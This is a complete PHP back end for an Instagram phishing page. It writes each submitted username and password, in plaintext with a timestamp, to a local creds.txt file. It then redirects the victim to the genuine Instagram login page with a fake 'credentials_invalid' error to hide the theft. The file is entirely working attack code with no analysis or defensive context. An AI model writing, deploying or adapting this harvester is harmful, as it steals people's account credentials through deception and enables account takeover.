<?php
$credsFile = __DIR__ . '/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if ($username === '' || $password === '') {
        header('Location: index.php?error=' . urlencode('Please fill both fields'));
        exit;
    }

    $entry = "[" . date('Y-m-d H:i:s') . "] Username: $username | Password: $password\n";
    file_put_contents($credsFile, $entry, FILE_APPEND);

    // Redirect to the real Instagram login page
    header('Location: https://www.instagram.com/accounts/login/?error=credentials_invalid');
    exit;
}

header('Location: index.php');
exit;
?>

